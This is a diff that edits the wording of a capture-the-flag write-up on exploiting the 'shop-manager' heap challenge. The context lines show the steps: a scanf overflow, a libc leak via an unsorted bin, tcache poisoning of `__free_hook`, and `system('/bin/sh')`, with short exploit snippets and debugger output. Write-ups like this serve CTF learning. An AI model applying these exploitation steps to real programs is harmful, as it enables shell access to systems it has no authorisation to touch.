@@ -18,7 +18,7 @@ shop-manager-master-public.zip
 
 ## Analysis:
 
-The menu is as follows, and this binary has `Add`,` Delete`, `Edit`,` List`, `Sell` functions.
+The menu is as follows, and this binary has `Add`, `Delete`, `Edit`, `List`, `Sell` functions.
 
 ```
 Menu:
@@ -31,7 +31,7 @@ Menu:
 ```
 The `Item name` input for the `Add` and `Edit` functions uses `__isoc99_scanf("%s", buf)`. Therefore, it has a heap buffer overflow vulnerability because it does not check the size of the input string.
 
-Below is the compilation result of addItem ().
+Below is the compile result of `addItem()` by Ghidra.
 
 ```c
 void addItem(void)
@@ -97,13 +97,13 @@ I can create a 0x430 size unsorted bin chunk by deleting the 1st Item.
 0x604300:	0x0000000000000000	0x0000000000000021
 ```
 
-In addition, the Add item allows you to put the address of the unsorted bin chunk in the 2nd chunk, so I can leak the libc address with the List of added items feature.
+Furthermore, if I execute the `Add` function, I can put the address of the unsorted bin chunk in the 2nd chunk, so you can leak the libc address with the` List` function.
 ```
     'Name: `G`\n'
-    'Price: 140737351834784\n'
+    'Price: 140737351834784\n'      =>  0x00007ffff7dcdca0
 ```
 
-Now that we have chunk overhauled, I can use the Add, Delete and Edit features to put `__free_hook` in tcache.
+Now that you have chunk overhauled, you can put `__free_hook` into tcache using the `Add`, `Delete` and `Edit` features shown below.
 ```
 # tcache poisoning
 Add("c", 3)
@@ -119,7 +119,7 @@ tcachebins
 0x20 [100]: 0x604310 —▸ 0x7ffff7dcf8e8 (__free_hook) ◂— 0x0
 ```
 
-Finally, write `/bin/sh` to Price of the 14th chunk, write the address of the　`system` function to `__free_hook`, and delete the 14th chunk to start the shell.
+Finally, I write `/bin/sh` to Price of the 14th chunk, I write the address of the `system` function to `__free_hook`, and delete the 14th chunk to start the shell.
 
 ```
 # Write system address in __free_hook
@@ -130,7 +130,7 @@ Add("f", system_addr)
 Delete(14)
 ```
 
-I didn't use the Sell function.
+I didn't use the `Sell` function.
 
 
 ## Exploit code:
